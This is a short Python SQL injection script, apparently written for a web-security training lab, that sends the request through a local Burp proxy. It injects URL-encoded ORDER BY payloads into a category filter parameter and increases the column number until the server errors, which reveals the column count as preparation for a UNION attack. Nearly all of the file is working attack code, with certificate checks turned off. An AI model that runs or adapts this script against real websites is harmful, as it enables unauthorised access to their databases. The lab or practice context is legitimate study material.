import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Whenever the script runs, it will pass the request throught these proxies
# using the Burp Suite.
proxies = {'http': 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def exploit_sqli_col(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i # URL-encoded
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sqli_payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columns ...")
    num_col = exploit_sqli_col(url)

    if num_col > 0:
        print("[+] The number of columns is = " + str(num_col))
    else:
        print("[-] The SQLi attack was not successful.")
